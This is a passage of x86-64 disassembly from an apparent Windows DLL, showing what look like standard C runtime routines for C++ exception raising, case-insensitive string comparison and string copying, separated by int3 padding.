   1800045ee:	4a 8d 0c a0          	lea    (%rax,%r12,4),%rcx
   1800045f2:	48 03 cf             	add    %rdi,%rcx
   1800045f5:	e8 76 f6 ff ff       	call   0x180003c70
   1800045fa:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1800045ff:	85 c0                	test   %eax,%eax
   180004601:	75 11                	jne    0x180004614
   180004603:	ff cb                	dec    %ebx
   180004605:	49 83 c6 04          	add    $0x4,%r14
   180004609:	85 db                	test   %ebx,%ebx
   18000460b:	7f c3                	jg     0x1800045d0
   18000460d:	0f b6 7c 24 68       	movzbl 0x68(%rsp),%edi
   180004612:	eb 08                	jmp    0x18000461c
   180004614:	40 b7 01             	mov    $0x1,%dil
   180004617:	40 88 7c 24 68       	mov    %dil,0x68(%rsp)
   18000461c:	41 ff c7             	inc    %r15d
   18000461f:	45 3b 7d 00          	cmp    0x0(%r13),%r15d
   180004623:	0f 8c 77 ff ff ff    	jl     0x1800045a0
   180004629:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
   18000462e:	4c 8b 64 24 30       	mov    0x30(%rsp),%r12
   180004633:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   180004638:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   18000463d:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   180004642:	40 0f b6 c7          	movzbl %dil,%eax
   180004646:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   18000464b:	48 83 c4 48          	add    $0x48,%rsp
   18000464f:	41 5d                	pop    %r13
   180004651:	5e                   	pop    %rsi
   180004652:	c3                   	ret
   180004653:	e8 18 14 00 00       	call   0x180005a70
   180004658:	cc                   	int3
   180004659:	cc                   	int3
   18000465a:	cc                   	int3
   18000465b:	cc                   	int3
   18000465c:	cc                   	int3
   18000465d:	cc                   	int3
   18000465e:	cc                   	int3
   18000465f:	cc                   	int3
   180004660:	40 53                	rex push %rbx
   180004662:	55                   	push   %rbp
   180004663:	56                   	push   %rsi
   180004664:	57                   	push   %rdi
   180004665:	48 83 ec 28          	sub    $0x28,%rsp
   180004669:	33 db                	xor    %ebx,%ebx
   18000466b:	48 8b f1             	mov    %rcx,%rsi
   18000466e:	39 19                	cmp    %ebx,(%rcx)
   180004670:	7e 59                	jle    0x1800046cb
   180004672:	48 63 7e 04          	movslq 0x4(%rsi),%rdi
   180004676:	48 63 c3             	movslq %ebx,%rax
   180004679:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   18000467d:	48 8d 2c 8d 00 00 00 	lea    0x0(,%rcx,4),%rbp
   180004684:	00 
   180004685:	e8 46 e8 ff ff       	call   0x180002ed0
   18000468a:	48 03 c7             	add    %rdi,%rax
   18000468d:	83 7c 28 04 00       	cmpl   $0x0,0x4(%rax,%rbp,1)
   180004692:	74 1b                	je     0x1800046af
   180004694:	48 63 7e 04          	movslq 0x4(%rsi),%rdi
   180004698:	e8 33 e8 ff ff       	call   0x180002ed0
   18000469d:	48 03 c5             	add    %rbp,%rax
   1800046a0:	48 63 7c 38 04       	movslq 0x4(%rax,%rdi,1),%rdi
   1800046a5:	e8 26 e8 ff ff       	call   0x180002ed0
   1800046aa:	48 03 c7             	add    %rdi,%rax
   1800046ad:	eb 02                	jmp    0x1800046b1
   1800046af:	33 c0                	xor    %eax,%eax
   1800046b1:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1800046b5:	48 8d 15 6c 63 01 00 	lea    0x1636c(%rip),%rdx        # 0x18001aa28
   1800046bc:	e8 3f db ff ff       	call   0x180002200
   1800046c1:	85 c0                	test   %eax,%eax
   1800046c3:	74 11                	je     0x1800046d6
   1800046c5:	ff c3                	inc    %ebx
   1800046c7:	3b 1e                	cmp    (%rsi),%ebx
   1800046c9:	7c a7                	jl     0x180004672
   1800046cb:	32 c0                	xor    %al,%al
   1800046cd:	48 83 c4 28          	add    $0x28,%rsp
   1800046d1:	5f                   	pop    %rdi
   1800046d2:	5e                   	pop    %rsi
   1800046d3:	5d                   	pop    %rbp
   1800046d4:	5b                   	pop    %rbx
   1800046d5:	c3                   	ret
   1800046d6:	b0 01                	mov    $0x1,%al
   1800046d8:	48 83 c4 28          	add    $0x28,%rsp
   1800046dc:	5f                   	pop    %rdi
   1800046dd:	5e                   	pop    %rsi
   1800046de:	5d                   	pop    %rbp
   1800046df:	5b                   	pop    %rbx
   1800046e0:	c3                   	ret
   1800046e1:	cc                   	int3
   1800046e2:	cc                   	int3
   1800046e3:	cc                   	int3
   1800046e4:	cc                   	int3
   1800046e5:	cc                   	int3
   1800046e6:	cc                   	int3
   1800046e7:	cc                   	int3
   1800046e8:	cc                   	int3
   1800046e9:	cc                   	int3
   1800046ea:	cc                   	int3
   1800046eb:	cc                   	int3
   1800046ec:	cc                   	int3
   1800046ed:	cc                   	int3
   1800046ee:	cc                   	int3
   1800046ef:	cc                   	int3
   1800046f0:	48 8b c2             	mov    %rdx,%rax
   1800046f3:	49 8b d0             	mov    %r8,%rdx
   1800046f6:	48 ff e0             	rex.W jmp *%rax
   1800046f9:	cc                   	int3
   1800046fa:	cc                   	int3
   1800046fb:	cc                   	int3
   1800046fc:	cc                   	int3
   1800046fd:	cc                   	int3
   1800046fe:	cc                   	int3
   1800046ff:	cc                   	int3
   180004700:	49 8b c0             	mov    %r8,%rax
   180004703:	4c 8b d2             	mov    %rdx,%r10
   180004706:	48 8b d0             	mov    %rax,%rdx
   180004709:	45 8b c1             	mov    %r9d,%r8d
   18000470c:	49 ff e2             	rex.WB jmp *%r10
   18000470f:	cc                   	int3
   180004710:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   180004714:	48 8d 05 b5 ba 00 00 	lea    0xbab5(%rip),%rax        # 0x1800101d0
   18000471b:	48 85 d2             	test   %rdx,%rdx
   18000471e:	48 0f 45 c2          	cmovne %rdx,%rax
   180004722:	c3                   	ret
   180004723:	cc                   	int3
   180004724:	cc                   	int3
   180004725:	cc                   	int3
   180004726:	cc                   	int3
   180004727:	cc                   	int3
   180004728:	cc                   	int3
   180004729:	cc                   	int3
   18000472a:	cc                   	int3
   18000472b:	cc                   	int3
   18000472c:	cc                   	int3
   18000472d:	cc                   	int3
   18000472e:	cc                   	int3
   18000472f:	cc                   	int3
   180004730:	cc                   	int3
   180004731:	cc                   	int3
   180004732:	cc                   	int3
   180004733:	cc                   	int3
   180004734:	cc                   	int3
   180004735:	cc                   	int3
   180004736:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000473d:	00 00 00 
   180004740:	cc                   	int3
   180004741:	cc                   	int3
   180004742:	cc                   	int3
   180004743:	cc                   	int3
   180004744:	cc                   	int3
   180004745:	cc                   	int3
   180004746:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000474d:	00 00 00 
   180004750:	cc                   	int3
   180004751:	cc                   	int3
   180004752:	cc                   	int3
   180004753:	cc                   	int3
   180004754:	cc                   	int3
   180004755:	cc                   	int3
   180004756:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000475d:	00 00 00 
   180004760:	cc                   	int3
   180004761:	cc                   	int3
   180004762:	cc                   	int3
   180004763:	cc                   	int3
   180004764:	cc                   	int3
   180004765:	cc                   	int3
   180004766:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000476d:	00 00 00 
   180004770:	48 83 ec 28          	sub    $0x28,%rsp
   180004774:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180004779:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   18000477e:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   180004783:	48 8b 12             	mov    (%rdx),%rdx
   180004786:	48 8b c1             	mov    %rcx,%rax
   180004789:	e8 12 dd ff ff       	call   0x1800024a0
   18000478e:	ff d0                	call   *%rax
   180004790:	e8 3b dd ff ff       	call   0x1800024d0
   180004795:	48 8b c8             	mov    %rax,%rcx
   180004798:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   18000479d:	48 8b 12             	mov    (%rdx),%rdx
   1800047a0:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1800047a6:	e8 f5 dc ff ff       	call   0x1800024a0
   1800047ab:	48 83 c4 28          	add    $0x28,%rsp
   1800047af:	c3                   	ret
   1800047b0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1800047b5:	57                   	push   %rdi
   1800047b6:	48 83 ec 20          	sub    $0x20,%rsp
   1800047ba:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   1800047be:	48 8b fa             	mov    %rdx,%rdi
   1800047c1:	48 8b d9             	mov    %rcx,%rbx
   1800047c4:	74 6a                	je     0x180004830
   1800047c6:	4c 8b 01             	mov    (%rcx),%r8
   1800047c9:	4d 85 c0             	test   %r8,%r8
   1800047cc:	74 62                	je     0x180004830
   1800047ce:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   1800047d3:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   1800047da:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   1800047df:	90                   	nop
   1800047e0:	41 80 7c 00 01 00    	cmpb   $0x0,0x1(%r8,%rax,1)
   1800047e6:	48 8d 40 01          	lea    0x1(%rax),%rax
   1800047ea:	75 f4                	jne    0x1800047e0
   1800047ec:	48 8d 68 01          	lea    0x1(%rax),%rbp
   1800047f0:	48 8b cd             	mov    %rbp,%rcx
   1800047f3:	e8 e8 11 00 00       	call   0x1800059e0
   1800047f8:	48 8b f0             	mov    %rax,%rsi
   1800047fb:	48 85 c0             	test   %rax,%rax
   1800047fe:	74 15                	je     0x180004815
   180004800:	4c 8b 03             	mov    (%rbx),%r8
   180004803:	48 8b d5             	mov    %rbp,%rdx
   180004806:	48 8b c8             	mov    %rax,%rcx
   180004809:	e8 e2 11 00 00       	call   0x1800059f0
   18000480e:	48 89 37             	mov    %rsi,(%rdi)
   180004811:	c6 47 08 01          	movb   $0x1,0x8(%rdi)
   180004815:	33 c9                	xor    %ecx,%ecx
   180004817:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000481c:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   180004821:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180004826:	48 83 c4 20          	add    $0x20,%rsp
   18000482a:	5f                   	pop    %rdi
   18000482b:	e9 a0 11 00 00       	jmp    0x1800059d0
   180004830:	48 8b 01             	mov    (%rcx),%rax
   180004833:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180004838:	48 89 02             	mov    %rax,(%rdx)
   18000483b:	c6 42 08 00          	movb   $0x0,0x8(%rdx)
   18000483f:	48 83 c4 20          	add    $0x20,%rsp
   180004843:	5f                   	pop    %rdi
   180004844:	c3                   	ret
   180004845:	cc                   	int3
   180004846:	cc                   	int3
   180004847:	cc                   	int3
   180004848:	cc                   	int3
   180004849:	cc                   	int3
   18000484a:	cc                   	int3
   18000484b:	cc                   	int3
   18000484c:	cc                   	int3
   18000484d:	cc                   	int3
   18000484e:	cc                   	int3
   18000484f:	cc                   	int3
   180004850:	40 53                	rex push %rbx
   180004852:	48 83 ec 20          	sub    $0x20,%rsp
   180004856:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   18000485a:	48 8b d9             	mov    %rcx,%rbx
   18000485d:	74 19                	je     0x180004878
   18000485f:	48 8b 09             	mov    (%rcx),%rcx
   180004862:	e8 69 11 00 00       	call   0x1800059d0
   180004867:	c6 43 08 00          	movb   $0x0,0x8(%rbx)
   18000486b:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   180004872:	48 83 c4 20          	add    $0x20,%rsp
   180004876:	5b                   	pop    %rbx
   180004877:	c3                   	ret
   180004878:	c6 41 08 00          	movb   $0x0,0x8(%rcx)
   18000487c:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
   180004883:	48 83 c4 20          	add    $0x20,%rsp
   180004887:	5b                   	pop    %rbx
   180004888:	c3                   	ret
   180004889:	cc                   	int3
   18000488a:	cc                   	int3
   18000488b:	cc                   	int3
   18000488c:	cc                   	int3
   18000488d:	cc                   	int3
   18000488e:	cc                   	int3
   18000488f:	cc                   	int3
   180004890:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180004895:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000489a:	57                   	push   %rdi
   18000489b:	48 83 ec 50          	sub    $0x50,%rsp
   18000489f:	48 8b da             	mov    %rdx,%rbx
   1800048a2:	48 8b f1             	mov    %rcx,%rsi
   1800048a5:	bf 20 05 93 19       	mov    $0x19930520,%edi
   1800048aa:	48 85 d2             	test   %rdx,%rdx
   1800048ad:	74 1d                	je     0x1800048cc
   1800048af:	f6 02 10             	testb  $0x10,(%rdx)
   1800048b2:	74 18                	je     0x1800048cc
   1800048b4:	48 8b 09             	mov    (%rcx),%rcx
   1800048b7:	48 83 c1 f8          	add    $0xfffffffffffffff8,%rcx
   1800048bb:	48 8b 01             	mov    (%rcx),%rax
   1800048be:	48 8b 58 30          	mov    0x30(%rax),%rbx
   1800048c2:	48 8b 40 40          	mov    0x40(%rax),%rax
   1800048c6:	ff 15 8c a9 00 00    	call   *0xa98c(%rip)        # 0x18000f258
   1800048cc:	33 c0                	xor    %eax,%eax
   1800048ce:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800048d3:	48 85 db             	test   %rbx,%rbx
   1800048d6:	74 22                	je     0x1800048fa
   1800048d8:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1800048dd:	48 8b cb             	mov    %rbx,%rcx
   1800048e0:	ff 15 f2 a7 00 00    	call   *0xa7f2(%rip)        # 0x18000f0d8
   1800048e6:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800048eb:	f6 03 08             	testb  $0x8,(%rbx)
   1800048ee:	75 05                	jne    0x1800048f5
   1800048f0:	48 85 c0             	test   %rax,%rax
   1800048f3:	75 05                	jne    0x1800048fa
   1800048f5:	bf 00 40 99 01       	mov    $0x1994000,%edi
   1800048fa:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   1800048ff:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   180004904:	ba 01 00 00 00       	mov    $0x1,%edx
   180004909:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   18000490e:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   180004913:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   180004918:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   18000491e:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180004923:	ff 15 a7 a7 00 00    	call   *0xa7a7(%rip)        # 0x18000f0d0
   180004929:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   18000492e:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   180004933:	48 83 c4 50          	add    $0x50,%rsp
   180004937:	5f                   	pop    %rdi
   180004938:	c3                   	ret
   180004939:	cc                   	int3
   18000493a:	cc                   	int3
   18000493b:	cc                   	int3
   18000493c:	cc                   	int3
   18000493d:	cc                   	int3
   18000493e:	cc                   	int3
   18000493f:	cc                   	int3
   180004940:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180004945:	57                   	push   %rdi
   180004946:	48 83 ec 20          	sub    $0x20,%rsp
   18000494a:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   18000494e:	48 8b f9             	mov    %rcx,%rdi
   180004951:	48 85 d2             	test   %rdx,%rdx
   180004954:	74 15                	je     0x18000496b
   180004956:	0f 10 02             	movups (%rdx),%xmm0
   180004959:	48 8b c1             	mov    %rcx,%rax
   18000495c:	0f 11 41 08          	movups %xmm0,0x8(%rcx)
   180004960:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180004965:	48 83 c4 20          	add    $0x20,%rsp
   180004969:	5f                   	pop    %rdi
   18000496a:	c3                   	ret
   18000496b:	83 3d e2 63 01 00 00 	cmpl   $0x0,0x163e2(%rip)        # 0x18001ad54
   180004972:	75 19                	jne    0x18000498d
   180004974:	0f 10 05 7d 58 01 00 	movups 0x1587d(%rip),%xmm0        # 0x18001a1f8
   18000497b:	48 8b c7             	mov    %rdi,%rax
   18000497e:	0f 11 41 08          	movups %xmm0,0x8(%rcx)
   180004982:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180004987:	48 83 c4 20          	add    $0x20,%rsp
   18000498b:	5f                   	pop    %rdi
   18000498c:	c3                   	ret
   18000498d:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180004992:	e8 01 1c 00 00       	call   0x180006598
   180004997:	48 89 07             	mov    %rax,(%rdi)
   18000499a:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   18000499e:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   1800049a5:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   1800049a9:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   1800049b0:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   1800049b4:	48 8b c8             	mov    %rax,%rcx
   1800049b7:	e8 90 1d 00 00       	call   0x18000674c
   1800049bc:	48 8b 0f             	mov    (%rdi),%rcx
   1800049bf:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   1800049c3:	e8 f0 1d 00 00       	call   0x1800067b8
   1800049c8:	48 8b 0f             	mov    (%rdi),%rcx
   1800049cb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800049d0:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   1800049d6:	a8 02                	test   $0x2,%al
   1800049d8:	75 0d                	jne    0x1800049e7
   1800049da:	83 c8 02             	or     $0x2,%eax
   1800049dd:	89 81 a8 03 00 00    	mov    %eax,0x3a8(%rcx)
   1800049e3:	c6 47 18 01          	movb   $0x1,0x18(%rdi)
   1800049e7:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1800049ec:	48 8b c7             	mov    %rdi,%rax
   1800049ef:	48 83 c4 20          	add    $0x20,%rsp
   1800049f3:	5f                   	pop    %rdi
   1800049f4:	c3                   	ret
   1800049f5:	cc                   	int3
   1800049f6:	cc                   	int3
   1800049f7:	cc                   	int3
   1800049f8:	cc                   	int3
   1800049f9:	cc                   	int3
   1800049fa:	cc                   	int3
   1800049fb:	cc                   	int3
   1800049fc:	cc                   	int3
   1800049fd:	cc                   	int3
   1800049fe:	cc                   	int3
   1800049ff:	cc                   	int3
   180004a00:	48 83 ec 28          	sub    $0x28,%rsp
   180004a04:	48 85 c9             	test   %rcx,%rcx
   180004a07:	74 05                	je     0x180004a0e
   180004a09:	48 85 d2             	test   %rdx,%rdx
   180004a0c:	75 10                	jne    0x180004a1e
   180004a0e:	e8 e1 16 00 00       	call   0x1800060f4
   180004a13:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180004a19:	e8 2e 15 00 00       	call   0x180005f4c
   180004a1e:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   180004a23:	48 83 c4 28          	add    $0x28,%rsp
   180004a27:	c3                   	ret
   180004a28:	cc                   	int3
   180004a29:	cc                   	int3
   180004a2a:	cc                   	int3
   180004a2b:	cc                   	int3
   180004a2c:	cc                   	int3
   180004a2d:	cc                   	int3
   180004a2e:	cc                   	int3
   180004a2f:	cc                   	int3
   180004a30:	83 3d 1d 63 01 00 00 	cmpl   $0x0,0x1631d(%rip)        # 0x18001ad54
   180004a37:	4c 8b d2             	mov    %rdx,%r10
   180004a3a:	4c 8b c9             	mov    %rcx,%r9
   180004a3d:	75 52                	jne    0x180004a91
   180004a3f:	48 85 c9             	test   %rcx,%rcx
   180004a42:	74 48                	je     0x180004a8c
   180004a44:	48 85 d2             	test   %rdx,%rdx
   180004a47:	74 43                	je     0x180004a8c
   180004a49:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180004a50:	41 0f b6 09          	movzbl (%r9),%ecx
   180004a54:	4d 8d 49 01          	lea    0x1(%r9),%r9
   180004a58:	45 0f b6 02          	movzbl (%r10),%r8d
   180004a5c:	4d 8d 52 01          	lea    0x1(%r10),%r10
   180004a60:	41 3b c8             	cmp    %r8d,%ecx
   180004a63:	74 1b                	je     0x180004a80
   180004a65:	8d 41 bf             	lea    -0x41(%rcx),%eax
   180004a68:	83 f8 19             	cmp    $0x19,%eax
   180004a6b:	8d 51 20             	lea    0x20(%rcx),%edx
   180004a6e:	41 8d 40 bf          	lea    -0x41(%r8),%eax
   180004a72:	0f 47 d1             	cmova  %ecx,%edx
   180004a75:	8b ca                	mov    %edx,%ecx
   180004a77:	83 f8 19             	cmp    $0x19,%eax
   180004a7a:	77 04                	ja     0x180004a80
   180004a7c:	41 83 c0 20          	add    $0x20,%r8d
   180004a80:	8b c1                	mov    %ecx,%eax
   180004a82:	41 2b c0             	sub    %r8d,%eax
   180004a85:	75 12                	jne    0x180004a99
   180004a87:	85 c9                	test   %ecx,%ecx
   180004a89:	75 c5                	jne    0x180004a50
   180004a8b:	c3                   	ret
   180004a8c:	e9 6f ff ff ff       	jmp    0x180004a00
   180004a91:	45 33 c0             	xor    %r8d,%r8d
   180004a94:	e9 07 00 00 00       	jmp    0x180004aa0
   180004a99:	c3                   	ret
   180004a9a:	cc                   	int3
   180004a9b:	cc                   	int3
   180004a9c:	cc                   	int3
   180004a9d:	cc                   	int3
   180004a9e:	cc                   	int3
   180004a9f:	cc                   	int3
   180004aa0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180004aa5:	57                   	push   %rdi
   180004aa6:	48 83 ec 40          	sub    $0x40,%rsp
   180004aaa:	49 8b c0             	mov    %r8,%rax
   180004aad:	48 8b da             	mov    %rdx,%rbx
   180004ab0:	48 8b f9             	mov    %rcx,%rdi
   180004ab3:	48 85 c9             	test   %rcx,%rcx
   180004ab6:	75 20                	jne    0x180004ad8
   180004ab8:	e8 37 16 00 00       	call   0x1800060f4
   180004abd:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180004ac3:	e8 84 14 00 00       	call   0x180005f4c
   180004ac8:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   180004acd:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180004ad2:	48 83 c4 40          	add    $0x40,%rsp
   180004ad6:	5f                   	pop    %rdi
   180004ad7:	c3                   	ret
   180004ad8:	48 85 d2             	test   %rdx,%rdx
   180004adb:	74 db                	je     0x180004ab8
   180004add:	45 32 c0             	xor    %r8b,%r8b
   180004ae0:	44 88 44 24 38       	mov    %r8b,0x38(%rsp)
   180004ae5:	48 85 c0             	test   %rax,%rax
   180004ae8:	74 0a                	je     0x180004af4
   180004aea:	0f 10 00             	movups (%rax),%xmm0
   180004aed:	0f 11 44 24 28       	movups %xmm0,0x28(%rsp)
   180004af2:	eb 7d                	jmp    0x180004b71
   180004af4:	83 3d 59 62 01 00 00 	cmpl   $0x0,0x16259(%rip)        # 0x18001ad54
   180004afb:	75 0e                	jne    0x180004b0b
   180004afd:	0f 10 05 f4 56 01 00 	movups 0x156f4(%rip),%xmm0        # 0x18001a1f8
   180004b04:	0f 11 44 24 28       	movups %xmm0,0x28(%rsp)
   180004b09:	eb 66                	jmp    0x180004b71
   180004b0b:	e8 88 1a 00 00       	call   0x180006598
   180004b10:	48 8b c8             	mov    %rax,%rcx
   180004b13:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180004b18:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   180004b1d:	48 8b 80 90 00 00 00 	mov    0x90(%rax),%rax
   180004b24:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180004b29:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   180004b30:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180004b35:	e8 12 1c 00 00       	call   0x18000674c
   180004b3a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   180004b3f:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   180004b44:	e8 6f 1c 00 00       	call   0x1800067b8
   180004b49:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   180004b4e:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   180004b54:	a8 02                	test   $0x2,%al
   180004b56:	75 13                	jne    0x180004b6b
   180004b58:	83 c8 02             	or     $0x2,%eax
   180004b5b:	41 b0 01             	mov    $0x1,%r8b
   180004b5e:	89 81 a8 03 00 00    	mov    %eax,0x3a8(%rcx)
   180004b64:	44 88 44 24 38       	mov    %r8b,0x38(%rsp)
   180004b69:	eb 06                	jmp    0x180004b71
   180004b6b:	44 0f b6 44 24 38    	movzbl 0x38(%rsp),%r8d
   180004b71:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   180004b76:	4c 8b 88 10 01 00 00 	mov    0x110(%rax),%r9
   180004b7d:	0f 1f 00             	nopl   (%rax)
   180004b80:	0f b6 07             	movzbl (%rdi),%eax
   180004b83:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180004b87:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   180004b8b:	42 0f b6 14 08       	movzbl (%rax,%r9,1),%edx
   180004b90:	0f b6 43 ff          	movzbl -0x1(%rbx),%eax
   180004b94:	42 0f b6 0c 08       	movzbl (%rax,%r9,1),%ecx
   180004b99:	8b c2                	mov    %edx,%eax
   180004b9b:	2b c1                	sub    %ecx,%eax
   180004b9d:	75 04                	jne    0x180004ba3
   180004b9f:	85 d2                	test   %edx,%edx
   180004ba1:	75 dd                	jne    0x180004b80
   180004ba3:	45 84 c0             	test   %r8b,%r8b
   180004ba6:	74 0c                	je     0x180004bb4
   180004ba8:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   180004bad:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   180004bb4:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180004bb9:	48 83 c4 40          	add    $0x40,%rsp
   180004bbd:	5f                   	pop    %rdi
   180004bbe:	c3                   	ret
   180004bbf:	cc                   	int3
   180004bc0:	48 3b ca             	cmp    %rdx,%rcx
   180004bc3:	74 30                	je     0x180004bf5
   180004bc5:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180004bca:	57                   	push   %rdi
   180004bcb:	48 83 ec 20          	sub    $0x20,%rsp
   180004bcf:	48 8b fa             	mov    %rdx,%rdi
   180004bd2:	48 8b d9             	mov    %rcx,%rbx
   180004bd5:	48 8b 03             	mov    (%rbx),%rax
   180004bd8:	48 85 c0             	test   %rax,%rax
   180004bdb:	74 05                	je     0x180004be2
   180004bdd:	e8 4e 86 00 00       	call   0x18000d230
   180004be2:	48 83 c3 08          	add    $0x8,%rbx
   180004be6:	48 3b df             	cmp    %rdi,%rbx
   180004be9:	75 ea                	jne    0x180004bd5
   180004beb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004bf0:	48 83 c4 20          	add    $0x20,%rsp
   180004bf4:	5f                   	pop    %rdi
   180004bf5:	c3                   	ret
   180004bf6:	cc                   	int3
   180004bf7:	cc                   	int3
   180004bf8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180004bfd:	57                   	push   %rdi
   180004bfe:	48 83 ec 20          	sub    $0x20,%rsp
   180004c02:	48 8b fa             	mov    %rdx,%rdi
   180004c05:	48 8b d9             	mov    %rcx,%rbx
   180004c08:	48 3b ca             	cmp    %rdx,%rcx
   180004c0b:	74 1a                	je     0x180004c27
   180004c0d:	48 8b 03             	mov    (%rbx),%rax
   180004c10:	48 85 c0             	test   %rax,%rax
   180004c13:	74 09                	je     0x180004c1e
   180004c15:	e8 16 86 00 00       	call   0x18000d230
   180004c1a:	85 c0                	test   %eax,%eax
   180004c1c:	75 0b                	jne    0x180004c29
   180004c1e:	48 83 c3 08          	add    $0x8,%rbx
   180004c22:	48 3b df             	cmp    %rdi,%rbx
   180004c25:	75 e6                	jne    0x180004c0d
   180004c27:	33 c0                	xor    %eax,%eax
   180004c29:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004c2e:	48 83 c4 20          	add    $0x20,%rsp
   180004c32:	5f                   	pop    %rdi
   180004c33:	c3                   	ret
   180004c34:	b8 63 73 6d e0       	mov    $0xe06d7363,%eax
   180004c39:	3b c8                	cmp    %eax,%ecx
   180004c3b:	74 03                	je     0x180004c40
   180004c3d:	33 c0                	xor    %eax,%eax
   180004c3f:	c3                   	ret
   180004c40:	8b c8                	mov    %eax,%ecx
   180004c42:	e9 01 00 00 00       	jmp    0x180004c48
   180004c47:	cc                   	int3
   180004c48:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180004c4d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180004c52:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180004c57:	57                   	push   %rdi
   180004c58:	48 83 ec 20          	sub    $0x20,%rsp
   180004c5c:	48 8b f2             	mov    %rdx,%rsi
   180004c5f:	8b f9                	mov    %ecx,%edi
   180004c61:	e8 92 19 00 00       	call   0x1800065f8
   180004c66:	45 33 c9             	xor    %r9d,%r9d
   180004c69:	48 8b d8             	mov    %rax,%rbx
   180004c6c:	48 85 c0             	test   %rax,%rax
   180004c6f:	74 1f                	je     0x180004c90
   180004c71:	48 8b 08             	mov    (%rax),%rcx
   180004c74:	48 8b c1             	mov    %rcx,%rax
   180004c77:	4c 8d 81 c0 00 00 00 	lea    0xc0(%rcx),%r8
   180004c7e:	49 3b c8             	cmp    %r8,%rcx
   180004c81:	74 0d                	je     0x180004c90
   180004c83:	39 38                	cmp    %edi,(%rax)
   180004c85:	74 20                	je     0x180004ca7
   180004c87:	48 83 c0 10          	add    $0x10,%rax
